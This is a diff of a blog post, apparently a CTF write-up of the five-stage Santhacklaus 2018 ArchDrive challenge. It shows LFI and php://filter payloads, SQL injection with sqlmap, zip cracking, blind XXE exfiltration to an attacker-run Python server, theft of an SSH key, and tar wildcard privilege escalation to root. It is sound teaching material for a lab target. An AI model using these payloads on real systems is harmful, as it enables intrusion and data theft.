@@ -9,25 +9,23 @@ nopaging = "true"
 
 ArchDrive is the biggest challenge of the Santhacklaus 2018 CTF and my favorite one. It's divided in 5 steps of increasing difficulty. The challenge is not really hard, but particularly long and time-consuming. You need to have some strong skills in web pentesting, some basic skills in forensic and medium skills in Linux system.
 
-![](/img/santhacklaus/arch1.png "")
+![](/img/santhacklaus/arch1.png)
 
 So, as you can see, the 5 steps have their own validation password (flag). Let's start the challenge !
 
+# 1st step - Develop as in 2003
 
-
-## 1st step - Develop as in 2003
-
-![](/img/santhacklaus/arch2.png "")
+![](/img/santhacklaus/arch2.png)
 
 Here is our target : https://archdrive.santhacklaus.xyz/
 
-![](/img/santhacklaus/arch3.png "")
+![](/img/santhacklaus/arch3.png)
 
 First thing to do is to understand the application. **What is it ? What is doing ? What can be exploited ?**
 
 Referer to the challenge description, this application has a web storage functionnality. Here is the login page to access to your personnal storage. Is there any kind of "I forgot my password" page ?
 
-![](/img/santhacklaus/arch4.png "")
+![](/img/santhacklaus/arch4.png)
 
 Ok, the forgot password page is not really usefull. You can't enumerate some account, there is always the same message : `Email sent !`. But look further ! Look at the url and specifically to the arguments page. Look familiar to a vulnerability : Local File Inclusion. What it is a LFI ? Look at OWASP description : https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion
 
@@ -36,33 +34,29 @@ Ok, the forgot password page is not really usefull. You can't enumerate some acc
 There is below a vulnerable code to LFI. It’s really easy to prevent this type of vulnerability by adding some permissions checks before including the file.
 
 ```php
-<?php 
-    include($_GET['filename']); 
+<?php
+    include($_GET['filename']);
 ?>
 ```
 
 How can I check if this application is vulnerable to LFI. Really easy, just read the OWASP Guide : `http://vulnerable_host/preview.php?file=../../../../etc/passwd`. So for us, the example become : https://archdrive.santhacklaus.xyz/index.php?page=../../../../etc/passwd. If the server is an unix server, it will display the content of /etc/passwd, so all users of the server.
 
-![](/img/santhacklaus/arch5.png "")
+![](/img/santhacklaus/arch5.png)
 
 It works ! Congratz dude ! Look carefully to the last line. There is some great informations :
 
 - We see an username (maybe the administrator quote in challenge description) with possibility to log on the server (with /bin/bash) : `G0lD3N_Us3r`
 - We've got the flag of the first step : `IMTLD{Th1s_iS_4n_ImP0rt4nT_uS3r}`
 
+# 2nd step - Ho ! Nice holidays pictures :)
 
-
-
-
-## 2nd step - Ho ! Nice holidays pictures :)
-
-![](/img/santhacklaus/arch6.png "")
+![](/img/santhacklaus/arch6.png)
 
 We've got a nice LFI. What can we do with LFI ? Execute some code, read some files and many more... I'm a curious guy. I always want to know how developers made their applications. When you read the source code of `index.php`, you discover two others php pages : `login.php` and `reset.php`. So let's obtain all the source code !
 
 I can recommend you the Swissky CheatSheets : https://github.com/swisskyrepo/PayloadsAllTheThings. Scroll to File Inclusion section : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal
 
-On this sheet, you have all you need to exploit a LFI. How can I extract the application source code ? With php wrappers of course ! Some examples : 
+On this sheet, you have all you need to exploit a LFI. How can I extract the application source code ? With php wrappers of course ! Some examples :
 
 ```text
 http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
@@ -74,14 +68,13 @@ http://example.com/index.php?page=php://filter/bzip2.compress/convert.base64-enc
 
 {{< protips "I recommend you to always use the 2 last wrappers. Sometimes files are more heavy than you think. It's usefull to compress them." >}}
 
-
 Let extract the source code of the famous page : `reset.php` : https://archdrive.santhacklaus.xyz/index.php?page=php://filter/bzip2.compress/convert.base64-encode/resource=reset.php
 
-![](/img/santhacklaus/arch7.png "")
+![](/img/santhacklaus/arch7.png)
 
 Well done ! This the base64 code of the `reset.php` page. Let's decode this. As you can see, the data is not compressed (maybe file is too light) so you juste have to decode it.
 
-![](/img/santhacklaus/arch8.png "")
+![](/img/santhacklaus/arch8.png)
 
 We have some PHP code, sounds great !
 
@@ -138,8 +131,7 @@ We have some PHP code, sounds great !
 
 Nothing really usefull with the reset page. Maybe more in the login page.
 
-
-``` php
+```php
 <?php
 session_start();
 $state = new \stdClass();
@@ -148,7 +140,7 @@ if (isset($_POST['email']) && !empty($_POST['email'])) {
     if (isset($_POST['pass']) && !empty($_POST['pass'])) {
 
         $bdd = mysqli_connect('database:3306', 'archdrive-corpo-bdd-admin', '8mkxdcwwyvtk36snF2b4TcEqSjh4Cc', 'ctf-archdrive-corp');
-        
+
         if (mysqli_connect_errno()) {
             $state->return = 'error';
             $state->string = 'Connection error';
@@ -161,7 +153,7 @@ if (isset($_POST['email']) && !empty($_POST['email'])) {
         $pass = $_POST['pass'];
 
         $sql = "SELECT user,password FROM `access-users` WHERE user='" . $user . "' AND password='" . $pass . "'";
-        
+
         $res = mysqli_query($bdd, $sql);
 
         $num_row = mysqli_num_rows($res);
@@ -179,6 +171,7 @@ if (isset($_POST['email']) && !empty($_POST['email'])) {
 }
 ?>
 ```
+
 There are severals interestings things here :
 
 - Database credentials but useless because the database works on internal server (172.17.0.11 - saw in /etc/hosts)
@@ -196,8 +189,8 @@ $pass = $_POST['pass'];
 
 The developper sanitize the `$user` variable but forgot to sanitize the `$pass` variable. Too bad, suddenly it's possible to do some sql injection on the field password in the login form. But if you read the source code, you must have the good username. When you watch carefully the html code of `reset.php` you can clearly read `Email (only from @archdrive.corp)`. So we can guess a correct email could be `g0ld3n_us3r@archdrive.corp` (referer to the /etc/passwd file). So let's try this !
 
-![](/img/santhacklaus/arch9.png "")
-![](/img/santhacklaus/arch10.png "")
+![](/img/santhacklaus/arch9.png)
+![](/img/santhacklaus/arch10.png)
 
 Wonderful ! We are logged in ! But for people (like me) who don't like guessing, you can have the account credentials with the help of Sqlmap.
 
@@ -219,8 +212,8 @@ csqlmap -u "https://archdrive.santhacklaus.xyz/login.php" --data "email=a@b.c&pa
 [12:30:20] [INFO] fetched random HTTP User-Agent header value 'Opera/9.63 (Windows NT 5.1; U; pt-BR) Presto/2.1.1' from file '/opt/sqlmap/txt/user-agents.txt'
 [12:30:26] [INFO] testing for SQL injection on POST parameter 'pass'
 [12:30:27] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
-[12:30:27] [WARNING] time-based comparison requires larger statistical model, please wait............................  (done)                                                                                                                 
-[12:30:58] [INFO] POST parameter 'pass' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
+[12:30:27] [WARNING] time-based comparison requires larger statistical model, please wait............................  (done)
+[12:30:58] [INFO] POST parameter 'pass' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
 [12:30:58] [INFO] checking if the injection point on POST parameter 'pass' is a false positive
 POST parameter 'pass' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
 sqlmap identified the following injection point(s) with a total of 87 HTTP(s) requests:
@@ -232,9 +225,9 @@ Parameter: pass (POST)
 ---
 [12:32:49] [INFO] the back-end DBMS is MySQL
 web application technology: Nginx
-back-end DBMS: MySQL >= 5.0.12                                                                                                                                               
+back-end DBMS: MySQL >= 5.0.12
 
-[...]              
+[...]
 
 Database: ctf-archdrive-corp
 Table: access-users
@@ -251,11 +244,11 @@ I will not explain here how Sqlmap work, but you can easily understand the comma
 So you can now access to the storage. There is an amount of useless files. The archive `CONFIDENTIEL.zip` is a trap. Be focus on the encrypted archive `recup.zip`.
 
 ```
-[th1b4ud@th1b4ud-pc ~]$ unzip recup.zip 
+[th1b4ud@th1b4ud-pc ~]$ unzip recup.zip
 Archive:  recup.zip
-[recup.zip] password.txt password: 
+[recup.zip] password.txt password:
 
-[th1b4ud@th1b4ud-pc ~]$ unzip -l recup.zip 
+[th1b4ud@th1b4ud-pc ~]$ unzip -l recup.zip
 Archive:  recup.zip
   Length      Date    Time    Name
 ---------  ---------- -----   ----
@@ -267,7 +260,7 @@ Archive:  recup.zip
 Maybe the archive password is weak ? Try to break it with bruteforce attack with fcrackzip. Don't forget -u !
 
 ```
-[th1b4ud@th1b4ud-pc ~]$ fcrackzip -v -u -D -p /home/th1b4ud/dictionaries/rockyou.txt recup.zip 
+[th1b4ud@th1b4ud-pc ~]$ fcrackzip -v -u -D -p /home/th1b4ud/dictionaries/rockyou.txt recup.zip
 found file 'password.txt', (size cp/uc    271/   377, flags 9, chk 5aec)
 
 PASSWORD FOUND!!!!: pw == hackerman
@@ -307,13 +300,9 @@ Windobe123
 
 You can validate the step 2 with this password : `IMTLD{F1nd_Y0uR_W4y}`
 
+# 3rd step - Do you know VeraCrypt ?
 
-
-
-## 3rd step - Do you know VeraCrypt ?
-
-![](/img/santhacklaus/arch11.png "")
-
+![](/img/santhacklaus/arch11.png)
 
 If you look closer on files in the web storage, you can see an archive named `VeraCrypt.zip`. What is VeraCrypt ? Look at Wikipedia :
 
@@ -330,7 +319,7 @@ Gourd-crown2-gao4-warp2 - Take On Me
 
 Lets try to decipher the disk `media` and `documents`
 
-![](/img/santhacklaus/arch12.png "")
+![](/img/santhacklaus/arch12.png)
 
 - Password `7Rex-Mazda0-hover1-Quid` decrypt disk `media`
 - Password `0twain-Mao0-flash-6Goof-Gent` decrypt disk `documents`
@@ -375,9 +364,7 @@ I just read the first sentence and got an illumination :
 
 Of course ! Why not to try to decipher a disk with a password AND a file ! This is the meaning of the 2nd password in the `password.txt` file. `Gourd-crown2-gao4-warp2` is the password and `Take On Me` the keyfile ! Try this on the first disk `media`
 
-
-![](/img/santhacklaus/arch13.png "")
-
+![](/img/santhacklaus/arch13.png)
 
 ```
 [th1b4ud@th1b4ud-pc ~]$ tree /mnt
@@ -394,9 +381,10 @@ Of course ! Why not to try to decipher a disk with a password AND a file ! This 
     `-- System\ Volume\ Information
         `-- WPSettings.dat
 ```
+
 ![](https://media.giphy.com/media/95ZYXmOCd9BBK/source.gif)
 
-OHOHOOHHO FU**** GODDD ! IT WORKS !!!
+OHOHOOHHO FU\*\*\*\* GODDD ! IT WORKS !!!
 
 ```
 [th1b4ud@th1b4ud-pc ~]$ cat /mnt/veracrypt1/flag.txt
@@ -405,25 +393,23 @@ IMTLD{I_h4v3_N0th1ng_T0_h1d3}
 
 Congrats dude ! You can go to the step 4 ! :)
 
+# 4th step - Dive in BlackHat underground
 
-
-## 4th step - Dive in BlackHat underground
-
-![](/img/santhacklaus/arch14.png "")
-
+![](/img/santhacklaus/arch14.png)
 
 If you look carefully to the files obtained at the last step, you will see an interesting archive : `Dark_Lottery_ticket_d2e383e8600daf6dc31c2436aefd3f58.zip`. Unzip it !
 
 ```md
-Archive:  Dark_Lottery_ticket_d2e383e8600daf6dc31c2436aefd3f58.zip
-  inflating: README.md               
-  inflating: ticket.xml  
+Archive: Dark_Lottery_ticket_d2e383e8600daf6dc31c2436aefd3f58.zip
+inflating: README.md  
+ inflating: ticket.xml
 ```
 
 This is the content of `README.md`
 
 ```md
-### This ticket is the property of `Dark Lottery` ###
+### This ticket is the property of `Dark Lottery`
+
 If you are not the buyer and if you found / stole this ticket, you must delete it immediately.
 This ticket is unique, do not share it.
 Remember to use it at your own risk.
@@ -446,19 +432,19 @@ And this is the content of ticket.xml
 
 In `README.md` you've got a link to website in .onion. Fire Tor and navigate to this url
 
-![](/img/santhacklaus/arch15.png "")
+![](/img/santhacklaus/arch15.png)
 
 Huuuu ! Nice blackhat theme ! This website is for real hacker !
-The website is really simple. There is 2 pages : 
+The website is really simple. There is 2 pages :
 
 - `buy.php` where you can buy some dark tickets (but no tickets are available).
 - `play.php` where you can play if you already have a ticket.
 
-![](/img/santhacklaus/arch16.png "")
+![](/img/santhacklaus/arch16.png)
 
 This a game for us ! For blackhat like us ! Let's play the game and send our ticket.
 
-![](/img/santhacklaus/arch17.png "")
+![](/img/santhacklaus/arch17.png)
 
 Humm. Yep ! There is a mistake is our xml. This is better
 
@@ -470,7 +456,8 @@ Humm. Yep ! There is a mistake is our xml. This is better
     <type>premium</type>
 </ticket>
 ```
-![](/img/santhacklaus/arch18.png "")
+
+![](/img/santhacklaus/arch18.png)
 
 Ho sad ! We lost ! :(
 Stop crying boy. Lets go pwn this illegal lottery to uphold the law.
@@ -502,11 +489,11 @@ Serving HTTP on 0.0.0.0 port 4444 ...
 51.75.202.113 - - [27/Dec/2018 23:18:20] "GET / HTTP/1.0" 200 -
 ```
 
-Alright ! We received a GET request just after send our ticket. So how can we go further now ? 
+Alright ! We received a GET request just after send our ticket. So how can we go further now ?
 
 {{< protips "As always why don't pick some example from cheatsheet : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXEinjection ? :)" >}}
 
-Here, we will use the Blind XXE - Out of Band technique to extract some data. Some explanations : 
+Here, we will use the Blind XXE - Out of Band technique to extract some data. Some explanations :
 
 1. We send a malicious ticket to the victim
 2. The victim server will load a malicious file host on attacker server
@@ -550,10 +537,10 @@ And on the attacker’s server we receive the extracted data
 Serving HTTP on 0.0.0.0 port 4444 ...
 
 # This is the first GET request to obtain the malicious file
-51.75.202.113 - - [27/Dec/2018 23:41:22] "GET /exploit.dtd HTTP/1.0" 200 -   
+51.75.202.113 - - [27/Dec/2018 23:41:22] "GET /exploit.dtd HTTP/1.0" 200 -
 
 # This is the second GET request with exfiltrate data (here /etc/passwd)
-51.75.202.113 - - [27/Dec/2018 23:41:22] "GET /?xxe=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovYmluL2ZhbHNlCg== HTTP/1.0" 200 -                                             
+51.75.202.113 - - [27/Dec/2018 23:41:22] "GET /?xxe=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovYmluL2ZhbHNlCg== HTTP/1.0" 200 -
 ```
 
 So now, I think you are pro base64 decoder :p
@@ -587,7 +574,7 @@ Here is a nice python http server to gather our data to automate extraction task
 ```python
 #!/usr/bin/python2
 from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
-import urlparse, base64, os 
+import urlparse, base64, os
 
 # Listening port
 PORT = 4444
@@ -599,7 +586,7 @@ class Handler(BaseHTTPRequestHandler):
 	def do_GET(self):
 		query = urlparse.urlparse(self.path).query
 		file = urlparse.urlparse(self.path).path.replace("/", "")
-		
+
 		# If the victim server load our malicious file -> send it
 		if file:
 			if os.path.isfile(file):
@@ -612,7 +599,7 @@ class Handler(BaseHTTPRequestHandler):
 				self.send_response(404)
 				self.end_headers()
 				self.wfile.write("404 ERROR : File not found !")
-		
+
 		# Else if, the victim server send us data -> decode it
 		else:
 			b64data = query.replace('data=', '')
@@ -625,7 +612,7 @@ try:
 	# Create the web server
 	server = HTTPServer(('', PORT), Handler)
 	print '[*] Listening on port' , PORT
-	
+
 	# Wait forever for incoming HTTP requests
 	server.serve_forever()
 
@@ -638,11 +625,11 @@ Demo :
 
 ![](/img/santhacklaus/archdrive1.gif)
 
-So now we can read server files. Now the real question is : ___"Ok thanks but what am I supposed to find ?"___. This is a huge question. In my little ctf experience, is always the same things : ssh key, script, config (ssh, apache, nginx, etc...)
+So now we can read server files. Now the real question is : **_"Ok thanks but what am I supposed to find ?"_**. This is a huge question. In my little ctf experience, is always the same things : ssh key, script, config (ssh, apache, nginx, etc...)
 
 {{< protips "When you are in front of a LFI or something else who permit you to read files, I recommend you to be meticulous in you search with a cheatsheet (thanks captain obvious). The anwser will always in the cheatsheet !" >}}
 
-So navigate to this wonderful cheatsheet : https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ and start try to read some files. Why not check ssh server config (/etc/ssh/sshd_config) 
+So navigate to this wonderful cheatsheet : https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ and start try to read some files. Why not check ssh server config (/etc/ssh/sshd_config)
 
 ```bash
 ### SSH configuration file ###
@@ -689,6 +676,7 @@ Ho ! There is some interesting informations here :
 So ?! What do you think ? Why not try to steal this ssh private key ? Im sur the key is here ! But where ? Why not to try the default location of the public key readable by all : `/home/dark_lottery/.ssh/id_rsa.pub`
 
 ```
+
 ```
 
 Nothing... Hum strange... Try to read the private key. By default, the private key is only readable by is owner.
@@ -711,9 +699,9 @@ LAKwqo3/gOiPe8w5CRUWuDfuy04a81OBEF3Gv2pyVctg
 -----END RSA PRIVATE KEY-----
 ```
 
-HOHOH. READABLE ! What a huge mistake ! We can now connect to the server with user `dark_lottery`.
+We can now connect to the server with user `dark_lottery`.
 
-```bash 
+```bash
 [th1b4ud@th1b4ud-pc ~]$ ssh dark_lottery@51.75.202.113 -p 2020 -i key
 
     ___           _        __       _   _
@@ -730,7 +718,7 @@ individual files in /usr/share/doc/*/copyright.
 
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
-dark_lottery@9db68003fdde:~$ 
+dark_lottery@9db68003fdde:~$
 ```
 
 ```bash
@@ -743,14 +731,13 @@ drwxr-xr-x 1 root root         4096 Dec 20 18:27 ..
 -r-xr-x--- 1 root dark_lottery  675 Dec 20 18:27 .profile
 drwxr-x--- 1 root dark_lottery 4096 Dec 20 18:27 .ssh
 -r--r--r-- 1 root root           29 Dec 20 18:24 flag.txt
-dark_lottery@9db68003fdde:~$ cat flag.txt 
+dark_lottery@9db68003fdde:~$ cat flag.txt
 IMTLD{Wh4t_4_H4rD_ch4lL3nge}
 ```
-Yeah ! Only one step is remaining !
 
+Only one step is remaining !
 
-
-## 5th step - Let's escalate !
+# 5th step - Let's escalate !
 
 ![](/img/santhacklaus/arch19.png)
 
@@ -761,10 +748,10 @@ The description is explicit : 'finish the work' mean 'obtain root access'. Privi
 The first thing I do when I have to do a privilege escalation is to gather as much informations as i can about the server. This is the `Operating System` section in the cheatsheet. It's really usefull when the server is old and a public exploit is available.
 
 ```md
-dark_lottery@9db68003fdde:~$ uname -a
+dark_lottery@9db68003fdde:~\$ uname -a
 Linux 9db68003fdde 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
 
-dark_lottery@9db68003fdde:~$ cat /etc/*-release
+dark_lottery@9db68003fdde:~\$ cat /etc/\*-release
 PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
 NAME="Debian GNU/Linux"
 VERSION_ID="9"
@@ -838,7 +825,7 @@ drwxr-xr-x 1 root root 4096 Dec 20 18:27 .
 Oh ! Look at this. Some crontabs ! There is no interesting things in `cron.daily` (except the presence of unusual exim4 crontab). But look at `backup-cron` crontab.
 
 ```
-dark_lottery@9db68003fdde:/etc$ cat /etc/cron.d/backup-cron 
+dark_lottery@9db68003fdde:/etc$ cat /etc/cron.d/backup-cron
 * * * * * /bin/sh /backup.sh
 ```
 
@@ -862,7 +849,7 @@ Some vocabulary :
 In privesc, often the more usefull is suid permission. Let's check that.
 
 ```
-dark_lottery@9db68003fdde:/etc$ find / -perm -u=s -type f 2>/dev/null 
+dark_lottery@9db68003fdde:/etc$ find / -perm -u=s -type f 2>/dev/null
 /bin/ping
 /bin/su
 /bin/mount
@@ -877,7 +864,7 @@ dark_lottery@9db68003fdde:/etc$ find / -perm -u=s -type f 2>/dev/null
 /usr/sbin/exim4
 ```
 
-Haha `ping` is suid but it's a wrong way. Look at `exim4` binary. It's sometimes possible to do privesc with that. What is `exim` ? 
+Haha `ping` is suid but it's a wrong way. Look at `exim4` binary. It's sometimes possible to do privesc with that. What is `exim` ?
 
 `Exim4 is a very complete mail server, it is the default mail server on Debian. It allows to receive and send mails. It can be configured as server and / or client.`
 
@@ -939,11 +926,11 @@ You really don't see ? Return to our cheatsheet : https://github.com/swisskyrepo
 
 _`By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite easy, and that’s where the wildcard comes in handy.`_
 
-We will exploit `*` tar wildcard. Juste watch and learn ! The `'--checkpoint-action'` option, that will specify program which will be executed when checkpoint is reached. 
+We will exploit `*` tar wildcard. Juste watch and learn ! The `'--checkpoint-action'` option, that will specify program which will be executed when checkpoint is reached.
 
 ```bash
 # Go to the directory where everything is tar
-cd /opt/src         
+cd /opt/src
 
 # Create the 2 necessary widcard
 # man tar
@@ -982,20 +969,20 @@ AND VOILA ! You can validate the challenge !
 root@9db68003fdde:/opt/src# ls -al
 ls -al
 total 20
--rw-r--r-- 1 dark_lottery dark_lottery    0 Dec 29 23:17 --checkpoint-action=exec=bash shell.sh
--rw-r--r-- 1 dark_lottery dark_lottery    0 Dec 29 23:17 --checkpoint=1
-drwxrwxrwx 1 root         root         4096 Dec 29 23:17 .
-drwxr-xr-x 1 root         root         4096 Dec 20 18:27 ..
--r--r----- 1 root         root           26 Dec 20 18:24 .flag.txt
--rwxr-xr-x 1 dark_lottery dark_lottery   44 Dec 29 23:17 shell.sh
+-rw-r--r-- 1 dark_lottery dark_lottery 0 Dec 29 23:17 --checkpoint-action=exec=bash shell.sh
+-rw-r--r-- 1 dark_lottery dark_lottery 0 Dec 29 23:17 --checkpoint=1
+drwxrwxrwx 1 root root 4096 Dec 29 23:17 .
+drwxr-xr-x 1 root root 4096 Dec 20 18:27 ..
+-r--r----- 1 root root 26 Dec 20 18:24 .flag.txt
+-rwxr-xr-x 1 dark_lottery dark_lottery 44 Dec 29 23:17 shell.sh
 root@9db68003fdde:/opt/src# cat .flag.txt
 cat .flag.txt
 IMTLD{R04d_T0_Th3_sW1tCH}
 ```
 
-## Conclusion
+# Conclusion
 
-Wow already 1000 lines ! I speak too much :D
+Wow already 1000 lines !
 So what do we learned with this challenge ?
 
 - Exploiting an LFI vulnerability to get the webserver's source code.
